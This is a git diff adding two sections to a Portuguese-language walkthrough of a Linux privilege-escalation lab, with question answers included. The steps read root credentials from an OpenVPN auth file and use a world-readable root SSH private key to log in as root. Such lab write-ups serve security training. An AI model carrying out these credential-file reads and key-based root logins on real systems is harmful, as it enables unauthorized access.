@@ -813,3 +813,113 @@ root@debian:/home/user#
 ### Questões:
 
 - a. ***What is the full mysql command the user executed?*** *mysql -h somehost.local -uroot -ppassword123*
+
+## 17 - Passwords & Keys - Config Files 
+
+Os arquivos de configuração geralmente contêm senhas em texto simples ou outros formatos reversíveis. Vários softwares instalados em um sistema operacional possuem arquivos de configuração.
+
+Liste o conteúdo do diretório inicial do usuário:
+
+```shell
+user@debian:~$ ls 
+myvpn.ovpn  tools
+```
+Percebe-se a presença de um arquivo de configuração ***myvpn.ovpn***. O conteúdo do arquivo pode ser visualizado com:
+
+```shell
+user@debian:~$ cat myvpn.ovpn 
+client
+dev tun
+proto udp
+remote 10.10.10.10 1194
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+ca ca.crt
+tls-client
+remote-cert-tls server
+auth-user-pass /etc/openvpn/auth.txt
+comp-lzo
+verb 1
+reneg-sec 0
+```
+O arquivo deve conter uma referência a outro local (***/etc/openvpn/auth.txt***) onde as credenciais do usuário root possam ser encontradas. 
+
+```shell
+user@debian:~$ cat /etc/openvpn/auth.txt
+root
+password123
+```
+
+Mude para o usuário root, usando as credenciais.
+
+### Questões:
+
+- a. ***What file did you find the root user's credentials in?*** /etc/openvpn/auth.txt
+
+## 18 - Passwords & Keys - SSH Keys 
+
+Às vezes, os usuários fazem backups de arquivos importantes, mas não os protegem com as permissões corretas.
+
+Procure por arquivos e diretórios ocultos na raiz do sistema:
+
+```shell
+user@debian:~$ ls -la /
+total 96
+drwxr-xr-x 22 root root  4096 Aug 25  2019 .
+drwxr-xr-x 22 root root  4096 Aug 25  2019 ..
+drwxr-xr-x  2 root root  4096 Aug 25  2019 bin
+drwxr-xr-x  3 root root  4096 May 12  2017 boot
+drwxr-xr-x 12 root root  2820 Jul 15 07:33 dev
+drwxr-xr-x 67 root root  4096 Jul 15 07:33 etc
+drwxr-xr-x  3 root root  4096 May 15  2017 home
+lrwxrwxrwx  1 root root    30 May 12  2017 initrd.img -> boot/initrd.img-2.6.32-5-amd64
+drwxr-xr-x 12 root root 12288 May 14  2017 lib
+lrwxrwxrwx  1 root root     4 May 12  2017 lib64 -> /lib
+drwx------  2 root root 16384 May 12  2017 lost+found
+drwxr-xr-x  3 root root  4096 May 12  2017 media
+drwxr-xr-x  2 root root  4096 Jun 11  2014 mnt
+drwxr-xr-x  2 root root  4096 May 12  2017 opt
+dr-xr-xr-x 96 root root     0 Jul 15 07:31 proc
+drwx------  5 root root  4096 May 15  2020 root
+drwxr-xr-x  2 root root  4096 May 13  2017 sbin
+drwxr-xr-x  2 root root  4096 Jul 21  2010 selinux
+drwxr-xr-x  2 root root  4096 May 12  2017 srv
+drwxr-xr-x  2 root root  4096 Aug 25  2019 .ssh
+drwxr-xr-x 13 root root     0 Jul 15 07:31 sys
+drwxrwxrwt  2 root root  4096 Jul 15 07:54 tmp
+drwxr-xr-x 11 root root  4096 May 13  2017 usr
+drwxr-xr-x 14 root root  4096 May 13  2017 var
+lrwxrwxrwx  1 root root    27 May 12  2017 vmlinuz -> boot/vmlinuz-2.6.32-5-amd64
+```
+Para localizar todos os arquivos ou diretórios ocultos, execute:
+
+```shell
+find / -name ".*" -exec ls -l {} \; 2>/dev/null
+```
+
+Observa-se que parece haver um diretório oculto chamado ***.ssh***. Veja o conteúdo do diretório:
+
+```shell
+user@debian:~$ ls -l /.ssh/
+total 4
+-rw-r--r-- 1 root root 1679 Aug 25  2019 root_key
+```
+O arquivo ***root_key*** é legível por todos. Uma inspeção adicional deste arquivo deve indicar que é uma chave SSH privada. O nome do arquivo sugere que é para o usuário root.
+
+Copie a chave para o host atacante (é mais fácil apenas visualizar o conteúdo do arquivo ***root_key*** e copiar/colar a chave) e dar as permissões corretas, caso contrário, seu cliente SSH se recusará a usá-lo:
+
+```shell
+chmod 600 root_key
+```
+
+Use a chave para fazer login na VM Debian como a conta root:
+
+```shell
+ssh -i root_key root@IP_HOST_ALVO
+```
+
+### Questões:
+
+- a. ***Read and follow along with the above.*** *Não há necessidade de resposta*
